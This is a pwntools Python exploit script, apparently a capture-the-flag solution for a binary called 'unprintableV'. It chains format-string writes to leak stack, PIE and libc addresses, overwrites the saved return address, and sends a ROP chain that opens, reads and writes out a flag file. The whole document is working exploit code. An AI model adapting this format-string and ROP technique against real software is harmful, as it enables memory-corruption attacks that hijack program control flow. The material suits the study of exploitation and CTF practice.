from pwn import *
import sys, os
context.log_level = 'debug'
prog = './unprintableV'
libc = ELF("./libc.so.6")
def dbg():
	gdb.attach(p)
	p.interactive()
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def exp():
	global p
	p = process(prog,env={"LD_PRELOAD":"./libc.so.6"})
	#debug(0xa20)
	p.recvuntil("my gift: 0x")
	stack = int(p.recv(12), 16)
	p.recvuntil("test!\n")
	log.info('stack: ' + hex(stack))
	payload = "%{}c%6$hhn".format(stack&0xff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%10$hhn".format(0x20)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%9$hn".format(0x1680)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "AAAA%p-%3$p*"
	try:
		p.send(payload.ljust(0x12c,"\x00"))
		if p.recv(4, timeout=1) != 'AAAA':
			raise BaseException
	except:
		return False
		p.close()
	
	pie = int(p.recvuntil('-0x', drop = True)[-12:], 16)-2105440
	libc_base = int(p.recv(12), 16)- 1114241
	log.info("pie: "+hex(pie))
	log.info("libc_base: "+hex(libc_base))
	ret_addr = stack + 16
	rbp = ret_addr-8
	
	payload = "%{}c%12$hn".format(ret_addr&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format(libc_base+0x3960&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%12$hn".format(ret_addr+2&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format((libc_base+0x3960>>16)&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%12$hn".format(ret_addr+4&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format((libc_base+0x3960>>32)&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	
	buf = pie + 0x202060+16
	payload = "%{}c%17$hn".format(ret_addr+8&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format(buf&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%17$hn".format(ret_addr+10&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format((buf>>16)&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%17$hn".format(ret_addr+12&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	payload = "%{}c%43$hn".format((buf>>32)&0xffff)
	p.send(payload.ljust(0x12c, '\x00'))
	#debug(0xb23)
	pop_rdi = libc_base+0x000000000002155f
	pop_rsi = libc_base+0x0000000000023e6a
	pop_rdx = libc_base+0x0000000000001b96
	shellcode = 'd^3CTF\x00\x00'+'flag\x00\x00\x00'+p64(pop_rdi)+p64(pie+0x202068)+p64(pop_rsi)+p64(0)+p64(libc_base+libc.sym['open'])
	shellcode += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(pie+0x202160)+p64(pop_rdx)+p64(0x40)+p64(libc_base+libc.sym['read'])
	shellcode += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(pie+0x202160)+p64(pop_rdx)+p64(0x40)+p64(libc_base+libc.sym['write'])
	p.send(shellcode)
	p.interactive()
if __name__ == '__main__':
	while not exp():
		pass
	exp()
